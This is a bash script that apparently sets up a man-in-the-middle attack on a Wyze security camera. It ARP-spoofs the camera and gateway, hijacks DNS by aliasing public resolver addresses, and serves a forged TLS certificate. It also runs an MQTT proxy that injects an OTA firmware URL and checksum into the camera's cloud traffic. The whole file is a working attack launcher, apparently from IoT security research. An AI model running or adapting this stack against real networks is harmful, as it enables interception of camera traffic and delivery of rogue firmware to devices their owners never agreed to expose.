#!/bin/bash
# Bring the local MITM stack up for ONE camera (default .4.23) and prove each listener.
# macOS has no setsid; nohup keeps the children alive after this shell exits.
#
# Deterministic rebuild: the scapy venv, the TLS bundle and the served tree are created here if
# absent. The pf anchor is referenced from /etc/pf.conf (an unreferenced anchor is inert).
#
#   OTA_URL=... OTA_MD5=... wyze_mitm_up.sh [CAM [CAMMAC [GW [GWMAC [UP]]]]]
set -u
PY=/opt/homebrew/bin/python3
HERE="$(cd "$(dirname "$0")" && pwd)"
CAM="${1:-192.168.4.23}"; CAMMAC="${2:-80:48:2c:52:59:05}"; GW="${3:-192.168.4.1}"; GWMAC="${4:-48:dd:0c:c9:ec:0d}"
UP="${5:-192.168.4.160}"
OTA_URL="${OTA_URL:-https://s3-us-west-2.amazonaws.com/wuv2/upgrade/HL_CAM4/firmware/4.52.17.30.tar}"
OTA_MD5="${OTA_MD5:-00000000000000000000000000000000}"
THING="${THING:-80482c525905}"; DEV="${DEV:-80482C525905}"

# --- prerequisites -------------------------------------------------------------------------
[ -x /tmp/sp/bin/python ] || { python3 -m venv /tmp/sp && /tmp/sp/bin/pip -q install scapy; }
[ -s /tmp/serve443.pem ] || { echo "missing /tmp/serve443.pem (leaf+chain+key)"; exit 1; }
mkdir -p /tmp/fwserve/wuv2/upgrade/HL_CAM4/firmware /tmp/fwserve/img

sudo sysctl -w net.inet.ip.forwarding=1 >/dev/null
# stale listeners shadow new runs silently (EADDRINUSE)
for port in 443 8883 9101; do
  pids=$(sudo lsof -nP -tiTCP:"$port" -sTCP:LISTEN 2>/dev/null)
  [ -n "$pids" ] && sudo kill $pids 2>/dev/null && sleep 1
done
sudo pkill -f 'wyze_dns_redirect.py' 2>/dev/null
sudo pkill -f 'wyze_arp_spoof.py' 2>/dev/null
# Reference the anchor once; pf.conf is only reloaded when the reference is new.
if ! grep -q '^anchor "fss"' /etc/pf.conf; then
  printf '\nanchor "fss"\n' | sudo tee -a /etc/pf.conf >/dev/null
  sudo pfctl -f /etc/pf.conf 2>/dev/null
fi
# DNS is intercepted by aliasing the public resolvers the camera uses: a packet addressed to a
# local address is delivered to our :53 socket, whereas an rdr to a local address is not delivered
# on this host. The camera's own resolver list is 8.8.8.8/8.8.4.4/208.67.x/.4.1; the first three
# are covered here and answer instantly, so they win the race against the real gateway.
for ip in 8.8.8.8 8.8.4.4 208.67.220.123 208.67.222.123; do
  ifconfig en1 | grep -q "inet $ip " || sudo ifconfig en1 alias "$ip" 255.255.255.255
done
sudo pfctl -f /etc/pf.conf 2>/dev/null
sudo pfctl -e 2>/dev/null

sudo nohup "$PY" "$HERE/wyze_dns_redirect.py" "$UP" "$GW" > /tmp/dns.log 2>&1 &
sudo nohup /tmp/sp/bin/python "$HERE/wyze_arp_spoof.py" "$CAM" "$CAMMAC" "$GW" "$GWMAC" > /tmp/arp.log 2>&1 &
[ -s /tmp/int.pem ] || { cat "$HERE/../emudhra/emudhra_int_cross.pem" > /tmp/int.pem; echo >> /tmp/int.pem; }
sudo nohup "$PY" "$HERE/wyze_forge_serve.py" --dir /tmp/fwserve --port 443 \
  --cert /tmp/iot2.pem --key /tmp/iot2.key --intermediate /tmp/int.pem \
  > /tmp/tls.log 2>&1 &
sudo nohup "$PY" -m http.server 9101 --directory /tmp/fwserve/img > /tmp/img.log 2>&1 &
sudo THING="$THING" D="$HOME/.config/fss-lab/wyze_iot/$DEV" CHAIN=/tmp/serve443.pem \
  INJECT=1 OTA_URL="$OTA_URL" OTA_MD5="$OTA_MD5" \
  nohup "$PY" "$HERE/wyze_mqtt_mitm.py" > /tmp/mqproxy.log 2>&1 &
sleep 3
for probe in "udp 53" "tcp 443" "tcp 8883" "tcp 9101"; do
  set -- $probe
  n=$(sudo lsof -nP -i"$1:$2" -sTCP:LISTEN 2>/dev/null | wc -l | tr -d ' ')
  [ "$1" = udp ] && n=$(sudo lsof -nP -i"$1:$2" 2>/dev/null | wc -l | tr -d ' ')
  printf '%-10s %s\n' "$1:$2" "$([ "$n" -ge 2 ] && echo up || echo DOWN)"
done
[ "$(ps -ef | grep -c "[w]yze_arp_spoof")" -ge 1 ] && echo "spoof      up" || echo "spoof      DOWN"
echo "aliases    $(ifconfig en1 | grep -c 'inet 8.8\|inet 208.67') resolver alias(es)"
echo "delta      $OTA_URL md5=$OTA_MD5"
dig @"$UP" aws-iot.wyzecam.com +short +time=2 +tries=1
